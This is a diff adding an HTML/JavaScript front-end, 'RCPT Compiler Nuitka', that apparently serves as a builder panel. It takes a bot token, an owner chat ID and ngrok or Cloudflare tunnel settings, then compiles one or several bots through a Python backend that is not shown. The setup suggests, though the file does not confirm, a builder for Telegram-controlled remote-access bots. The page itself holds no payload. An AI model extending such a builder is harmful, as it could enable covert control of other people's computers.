@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>RCPT Compiler Nuitka</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #c9d1d9;
+  --text-muted: #8b949e;
+  --accent: #58a6ff;
+  --accent-glow: rgba(88,166,255,0.25);
+  --success: #a5d6a7;
+  --mono: 'JetBrains Mono', Menlo, Consolas, monospace;
+}
+
+* { box-sizing:border-box; margin:0; padding:0; }
+
+html, body {
+  width:100%;
+  height:100%;
+}
+
+body {
+  background:
+    radial-gradient(circle at 20% 20%, rgba(88,166,255,0.08), transparent 40%),
+    radial-gradient(circle at 80% 80%, rgba(88,166,255,0.05), transparent 40%),
+    var(--bg);
+  color:var(--text);
+  font-family: 'Inter', system-ui, sans-serif;
+  display:flex;
+}
+
+.panel {
+  width:100%;
+  height:100%;
+  max-width:none;
+  border-radius:0;
+  border:none;
+  display:flex;
+  flex-direction:column;
+  padding:20px 24px;
+  backdrop-filter: blur(6px);
+  animation: fadeSlide 0.35s ease;
+}
+
+.panel:hover {
+  transform:none;
+  box-shadow:none;
+}
+
+@keyframes fadeSlide {
+  from { opacity:0; transform:translateY(12px); }
+  to { opacity:1; transform:translateY(0); }
+}
+
+.title {
+  font-size:1.5rem;
+  font-weight:700;
+  color:#e6edf3;
+  text-align:center;
+  margin-bottom:1.2rem;
+}
+
+.field { margin-bottom:0.9rem; }
+
+.field label {
+  display:block;
+  font-size:0.85rem;
+  color:var(--text-muted);
+  margin-bottom:0.3rem;
+}
+
+input, select {
+  width:100%;
+  padding:0.65rem 0.85rem;
+  border-radius:8px;
+  border:1px solid #2a2f36;
+  background:#0b0f14;
+  color:var(--text);
+  font-size:0.9rem;
+  transition:all .2s ease;
+}
+
+input:hover, select:hover {
+  border-color:var(--accent);
+}
+
+input:focus, select:focus {
+  border-color:var(--accent);
+  box-shadow:0 0 0 2px var(--accent-glow);
+  outline:none;
+}
+
+.actions {
+  display:flex;
+  gap:8px;
+  margin:1rem 0;
+  flex-wrap:wrap;
+}
+
+button {
+  flex:1;
+  padding:0.7rem 1rem;
+  font-size:0.85rem;
+  font-weight:600;
+  border-radius:8px;
+  cursor:pointer;
+  transition:all .2s ease;
+  position:relative;
+  overflow:hidden;
+}
+
+button:active {
+  transform:scale(0.96);
+}
+
+button.primary {
+  background:linear-gradient(145deg,#5e60ce,#5390d9);
+  color:#fff;
+  border:none;
+}
+
+button.primary:hover {
+  background:linear-gradient(145deg,#6c74ff,#63a0ff);
+}
+
+button.outline {
+  background:transparent;
+  color:var(--text-muted);
+  border:1px solid var(--border);
+}
+
+button.outline:hover {
+  background:rgba(48,54,61,0.4);
+  color:var(--text);
+}
+
+.extra-options {
+  display:grid;
+  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+  gap:6px;
+}
+
+.extra-options .auth-item {
+  display:flex;
+  align-items:center;
+  gap:6px;
+  padding:5px 6px;
+  border-radius:6px;
+  transition:background 0.2s;
+}
+
+.extra-options .auth-item:hover {
+  background: rgba(88,166,255,0.06);
+}
+
+.extra-options .auth-item input[type="checkbox"] {
+  -webkit-appearance:none;
+  appearance:none;
+  width:16px;
+  height:16px;
+  border:2px solid var(--border);
+  border-radius:4px;
+  background-color:var(--panel);
+  position:relative;
+}
+
+.extra-options .auth-item input[type="checkbox"]:checked {
+  background:var(--accent);
+  border-color:var(--accent);
+}
+
+.extra-options .auth-item input[type="checkbox"]:checked::after {
+  content:'✔';
+  position:absolute;
+  top:50%;
+  left:50%;
+  transform:translate(-50%, -50%);
+  font-size:0.7rem;
+  color:#fff;
+}
+
+.extra-options .auth-item label {
+  font-size:0.85rem;
+}
+
+.terminal {
+  margin-top:10px;
+  flex:1;
+  width:100%;
+  background: linear-gradient(180deg,#0a0d14,#070a10);
+  border:1px solid #21262d;
+  border-radius:8px;
+  padding:10px;
+  overflow-y:auto;
+  font-family:var(--mono);
+  font-size:0.8rem;
+  line-height:1.5;
+  color:var(--success);
+  white-space:pre-wrap;
+  word-break:break-all;
+  position:relative;
+}
+
+.terminal::before {
+  content:"";
+  position:absolute;
+  inset:0;
+  background: repeating-linear-gradient(
+    to bottom,
+    transparent,
+    transparent 2px,
+    rgba(255,255,255,0.02) 3px
+  );
+  pointer-events:none;
+}
+
+.terminal::-webkit-scrollbar { width:6px; }
+.terminal::-webkit-scrollbar-thumb {
+  background:#3a444f;
+  border-radius:4px;
+}
+
+.modal {
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.8);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  z-index:2000;
+}
+
+.modal-content {
+  background:var(--panel);
+  padding:20px;
+  border-radius:12px;
+  border:1px solid var(--border);
+  width:90%;
+  max-width:480px;
+  max-height:80vh;
+  overflow-y:auto;
+}
+
+.modal-title {
+  font-size:1.2rem;
+  margin-bottom:0.6rem;
+}
+
+.modal-subtitle {
+  font-size:0.85rem;
+  margin-bottom:1rem;
+}
+
+.toggle-all {
+  font-size:0.8rem;
+  margin-bottom:0.8rem;
+}
+
+.modal-buttons {
+  margin-top:16px;
+  display:flex;
+  gap:10px;
+  justify-content:flex-end;
+}
+</style>
+</head>
+<body>
+
+<div class="panel">
+  <div class="title">RCPT Compiler Nuitka</div>
+
+  <div class="field"><label>Bot Token</label><input id="token" placeholder="Enter bot token"></div>
+  <div class="field"><label>Owner Chat ID</label><input id="chatid" placeholder="e.g. 123456789"></div>
+  <div class="field"><label>Ngrok Token</label><input id="ngrok" placeholder="Optional"></div>
+  <div class="field">
+    <label>Tunnel Provider</label>
+    <select id="provider">
+      <option>Ngrok</option>
+      <option>LocalTunnel</option>
+      <option>Cloudflare Tunnel</option>
+    </select>
+  </div>
+
+  <div class="field">
+    <label>Extra Options</label>
+    <div class="extra-options">
+      <div class="auth-item">
+        <input type="checkbox" id="send_exc">
+        <label for="send_exc">Send Executable (In Parts)</label>
+      </div>
+      <div class="auth-item">
+        <input type="checkbox" id="debug">
+        <label for="debug">Debug</label>
+      </div>
+      <div class="auth-item">
+        <input type="checkbox" id="encryption">
+        <label for="encryption">Encryption</label>
+      </div>
+      <div class="auth-item">
+        <input type="checkbox" id="assets_bundle">
+        <label for="encryption">Assets Bundle</label>
+      </div>
+    </div>
+  </div>
+
+  <div class="actions">
+    <button class="primary" onclick="runCompile()">Compile Single</button>
+    <button class="outline" onclick="openAuthSelector()">Select & Compile Multiple…</button>
+    <button class="outline" onclick="clearLog()">Clear Log</button>
+  </div>
+
+  <div id="terminal" class="terminal"></div>
+</div>
+
+<div id="authModal" class="modal" style="display:none;">
+  <div class="modal-content">
+    <div class="modal-title">Compile multiple bots</div>
+    <div class="modal-subtitle">Select which auth files from <code>auths/</code> to compile:</div>
+    <div class="toggle-all" onclick="toggleSelectAll()">Select all / Deselect all</div>
+    <div id="authList"></div>
+    <div class="modal-buttons">
+      <button class="outline" onclick="hideAuthModal()">Cancel</button>
+      <button class="primary" onclick="confirmSelected()">Compile Selected</button>
+    </div>
+  </div>
+</div>
+
+<script>
+function writeOut(text) {
+  const t = document.getElementById('terminal');
+  t.innerHTML += text.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '<br>';
+  t.scrollTop = t.scrollHeight;
+}
+
+function updateCompileOptions() {
+    const debug = document.getElementById("debug").checked;
+    const send_exec = document.getElementById("send_exc").checked;
+    const encryption = document.getElementById("encryption").checked;
+    const assets_bundle = document.getElementById("assets_bundle").checked;
+    window.pywebview.api.set_options(debug, send_exec, encryption, assets_bundle);
+}
+
+function clearLog() {
+  document.getElementById('terminal').innerHTML = '';
+}
+
+let authFilesCache = [];
+
+function showAuthModal(files) {
+  authFilesCache = files;
+  const container = document.getElementById('authList');
+  container.innerHTML = '';
+  if (files.length === 0) {
+    container.innerHTML = '<div style="color:var(--text-muted);padding:20px;text-align:center;">No .json files found in auths/</div>';
+    return;
+  }
+  files.forEach(f => {
+    const item = document.createElement('div');
+    item.className = 'auth-item';
+    item.innerHTML = `
+      <input type="checkbox" id="a-${f}" value="${f}" checked>
+      <label for="a-${f}">${f}</label>
+    `;
+    container.appendChild(item);
+  });
+  document.getElementById('authModal').style.display = 'flex';
+}
+
+function hideAuthModal() {
+  document.getElementById('authModal').style.display = 'none';
+}
+
+function toggleSelectAll() {
+  const boxes = document.querySelectorAll('#authList input');
+  const allChecked = boxes.length === [...boxes].filter(b => b.checked).length;
+  boxes.forEach(b => b.checked = !allChecked);
+}
+
+async function confirmSelected() {
+    updateCompileOptions();  // <-- ensure flags are updated
+
+    const checked = [...document.querySelectorAll('#authList input:checked')];
+    const selected = checked.map(el => el.value);
+    hideAuthModal();
+    if (selected.length === 0) {
+        writeOut("[INFO] No auth files selected");
+        return;
+    }
+    writeOut(`→ Starting compilation of ${selected.length} bot(s)`);
+    await window.pywebview.api.mass_compile(selected);
+}
+
+async function openAuthSelector() {
+  const info = await window.pywebview.api.check_auths();
+  if (!info.exists || info.files.length === 0) {
+    writeOut("[INFO] No .json auth files found in auths/ folder");
+    return;
+  }
+  showAuthModal(info.files);
+}
+
+async function runCompile() {
+    updateCompileOptions();  // <-- ensure flags are updated
+
+    const t = document.getElementById('token').value.trim();
+    const c = document.getElementById('chatid').value.trim();
+    const n = document.getElementById('ngrok').value.trim();
+    const p = document.getElementById('provider').value;
+
+    const lines = await window.pywebview.api.run_compile(t, c, n, p);
+    lines.forEach(l => writeOut(l));
+}
+
+async function init() {
+  const def = await window.pywebview.api.get_default_auth();
+  if (def.token)          document.getElementById('token').value = def.token;
+  if (def.chatid)         document.getElementById('chatid').value = def.chatid;
+  if (def.ngrok_token)    document.getElementById('ngrok').value = def.ngrok_token;
+  if (def.tunnel_provider) document.getElementById('provider').value = def.tunnel_provider;
+
+  document.getElementById('token').addEventListener('input', e =>
+    window.pywebview.api.check_token(e.target.value)
+  );
+}
+
+window.addEventListener('load', init);
+</script>
+</body>
+</html>
